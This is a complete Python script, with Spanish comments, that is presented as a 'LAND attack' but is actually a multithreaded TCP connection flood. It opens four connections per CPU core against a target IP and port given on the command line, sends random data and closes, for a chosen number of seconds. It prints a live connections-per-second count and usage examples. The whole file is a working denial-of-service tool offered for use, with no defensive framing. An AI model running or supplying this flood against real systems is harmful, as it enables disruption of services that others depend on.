#!/usr/bin/env python3
import socket
import random
import sys
import time
import threading
import os

class LandAttack:
    """LAND Attack - SYN packets with same source/dest IP (sin root)"""
    
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.running = True
        self.total_packets = 0
        self.lock = threading.Lock()
        
    def get_cpu_count(self):
        try:
            return os.cpu_count() * 4
        except:
            return 16
    
    def land_worker_normal(self, worker_id):
        """Worker LAND sin root - usando TCP normal"""
        end_time = time.time() + self.duration
        packet_count = 0
        
        while time.time() < end_time and self.running:
            for _ in range(500):
                if time.time() >= end_time:
                    break
                
                try:
                    # Socket TCP normal
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.settimeout(0.001)
                    
                    # Conectar a sí mismo (LAND effect)
                    # En TCP normal no podemos spoofear IP, pero podemos
                    # crear muchas conexiones rápidas que consuman recursos
                    sock.connect((self.target_ip, self.target_port))
                    
                    # Enviar datos
                    data = random._urandom(random.randint(100, 1400))
                    sock.send(data)
                    
                    # Cerrar rápidamente
                    sock.close()
                    packet_count += 1
                    
                except:
                    pass
            
            # Actualizar contador
            with self.lock:
                self.total_packets += packet_count
            packet_count = 0
    
    def start_attack(self):
        num_threads = self.get_cpu_count()
        
        print(f"[💀] LAND ATTACK - MODO SIN ROOT")
        print(f"[🎯] Target: {self.target_ip}:{self.target_port}")
        print(f"[⏱️] Duration: {self.duration}s")
        print(f"[🧵] Threads: {num_threads}")
        print(f"[⚠️] Modo: Conexiones rápidas (sin spoofing)")
        print(f"[⚡] Consumo de recursos por conexiones rápidas")
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.land_worker_normal, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        # Monitor simple
        start = time.time()
        last_packets = 0
        
        while time.time() - start < self.duration:
            time.sleep(1)
            with self.lock:
                current = self.total_packets
                pps = current - last_packets
                last_packets = current
            
            print(f"\r[📊] {int(time.time()-start)}s | Conexiones: {current:,} | {pps:,} cps", end="")
        
        self.running = False
        
        with self.lock:
            total = self.total_packets
        
        print(f"\n\n[✅] LAND Attack completado")
        print(f"[📊] Total conexiones: {total:,}")
        print(f"[📊] Conexiones/segundo: {total/self.duration:,.0f}")

def main():
    if len(sys.argv) != 4:
        print("Uso: python3 land.py <ip> <port> <time>")
        print("Ejemplo: python3 land.py 192.168.1.1 80 60")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration = int(sys.argv[3])
    
    attack = LandAttack(target_ip, target_port, duration)
    attack.start_attack()

if __name__ == "__main__":
    main()
